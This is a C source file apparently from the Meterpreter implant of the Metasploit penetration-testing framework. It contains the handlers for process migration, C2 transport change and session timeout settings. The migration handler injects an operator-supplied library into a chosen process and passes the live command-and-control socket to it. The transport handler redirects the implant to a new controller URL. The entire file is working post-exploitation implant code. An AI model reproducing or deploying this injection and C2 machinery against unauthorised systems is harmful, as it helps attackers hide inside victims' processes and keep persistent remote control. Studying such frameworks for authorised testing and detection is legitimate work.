#include "common.h"
#include "base_inject.h"
#include "passfd_server.h"

LONG passfd_thread(THREAD *thread) {
	SOCKET *orig_fd = (SOCKET *)(thread->parameter1);
	LPSTR sock_path = (LPSTR)(thread->parameter2);

	if (orig_fd == NULL || sock_path == NULL)
		return ERROR_INVALID_PARAMETER;

	return passfd(*orig_fd, sock_path);
}

DWORD
remote_request_core_migrate(Remote *remote, Packet *packet)
{
	char *sock_path;
	Packet * response = NULL;
	pid_t pid = 0;
	library l;
	DWORD result = 0;
	SOCKET orig_fd = 0;

	dprintf("[MIGRATE] Getting packet data");

	response = packet_create_response(packet);

	// Get the process identifier to inject into
	pid = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);
	// Get the target process architecture to inject into
	l.arch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);
	// Get the length of the library buffer
	l.length = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);
	// Receive the actual migration library buffer
	l.data = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
	// Get the library entry point
	l.entry_point = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ENTRY_POINT);
	// Get the library base address
	l.base_addr = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_BASE_ADDR);
	// Get the path for the local socket
	sock_path = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_SOCKET_PATH);

	dprintf("[MIGRATE] Migrating to %d, Arch: %d, Library Length: 0x%x, Library Base Address: 0x%x, Library Entry Point: 0x%x, Socket path : %s", 
			pid, 
			l.arch, 
			l.length,
			l.base_addr,	
			l.entry_point, 
			sock_path);

	if (remote->transport->get_socket) {
		orig_fd = remote->transport->get_socket(remote->transport);
	}
	
	dprintf("[MIGRATE] Creating passfd thread to share socket %d", orig_fd);

	THREAD *socket_thread = thread_create((THREADFUNK)passfd_thread, &orig_fd, sock_path, NULL);

	if (!socket_thread) {
		dprintf("[MIGRATE] Failed to create the passfd thread");
		packet_transmit_response(ERROR_INVALID_HANDLE, remote, response);
		return ERROR_INVALID_HANDLE;
	}

	if (!thread_run(socket_thread)) {
		thread_destroy(socket_thread);
		dprintf("[MIGRATE] Failed to run the passfd thread");
		packet_transmit_response(EINVAL, remote, response);
		return EINVAL;
	}

	dprintf("[MIGRATE] Injecting library");
	result = inject_library(pid, &l);
	if (result != 0) {
		thread_join(socket_thread);
		thread_destroy(socket_thread);
		packet_transmit_response(result, remote, response);
		return result;
	}

	thread_join(socket_thread);
	thread_destroy(socket_thread);

	dprintf("[MIGRATE] return success");
	packet_transmit_response(ERROR_SUCCESS, remote, response);	
	return FALSE;
}

BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* pResult) {
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Packet* response = packet_create_response(packet);
	UINT transportType = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_TYPE);
	char* transportUrl = packet_get_tlv_value_string(packet, TLV_TYPE_TRANS_URL);

	TimeoutSettings timeouts;
	timeouts.expiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

	if (timeouts.expiry == 0) {
		timeouts.expiry = remote->transport->timeouts.expiry;
	}
	if (timeouts.comms == 0) {
		timeouts.comms = remote->transport->timeouts.comms;
	}
	if (timeouts.retry_total == 0) {
		timeouts.retry_total = remote->transport->timeouts.retry_total;
	}
	if (timeouts.retry_wait == 0) {
		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
	}

	dprintf("[CHANGE TRANS] Type: %u", transportType);
	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
	dprintf("[CHANGE TRANS] Expiration: %d", timeouts.expiry);
	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);

	do {
		if (response == NULL || transportUrl == NULL) {
			dprintf("[CHANGE TRANS] Something was NULL");
			break;
		}

		if (transportType == METERPRETER_TRANSPORT_SSL) {
			remote->next_transport = remote->trans_create_tcp(transportUrl, &timeouts);
		}
		else {
			// We still don't do this! But one day.. *shakes fist*
			break;
		}

		// tell the server dispatch to exit, it should pick up the new transport
		result = ERROR_SUCCESS;
	} while (0);

	if (packet) {
		packet_transmit_empty_response(remote, response, result);
	}

	return result == ERROR_SUCCESS ? FALSE : TRUE;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
 *         this message is the new/current settings.
 */
DWORD remote_request_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		// TODO: put this in a helper function that can be used everywhere?

		// if it's in the past, that's fine, but 0 implies not set
		if (expirationTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
			remote->transport->timeouts.expiry = expirationTimeout;
			remote->transport->expiration_end = expirationTimeout + current_unix_timestamp();
		}

		if (commsTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->transport->expiration_end - current_unix_timestamp());
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}
